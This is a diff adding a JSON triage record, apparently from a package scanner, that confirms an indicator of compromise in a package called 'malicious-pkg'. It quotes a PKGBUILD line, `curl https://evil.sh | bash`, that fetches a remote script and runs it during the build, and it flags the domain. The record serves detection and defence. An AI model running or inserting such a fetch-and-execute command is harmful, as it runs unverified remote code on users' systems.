@@ -1,0 +1,17 @@
+{
+  "branch": "triage/ioc-malicious-pkg-199dde6a",
+  "event": "trustsight.confirmed-ioc",
+  "ioc_entries": [
+    {
+      "confidence": "high",
+      "provenance": "PKGBUILD source function line: `curl https://evil.sh | bash`",
+      "type": "domain",
+      "value": "evil.sh"
+    }
+  ],
+  "package": "malicious-pkg",
+  "priority": "default",
+  "rationale": "The PKGBUILD fetches a script from an evil domain and pipes it directly to bash for execution during the build, which is actual malicious behavior (fetch-and-execute of unverified remote code).",
+  "title": "Confirmed IOC: malicious-pkg",
+  "version_transition": "1.0-1 to 1.0-2"
+}
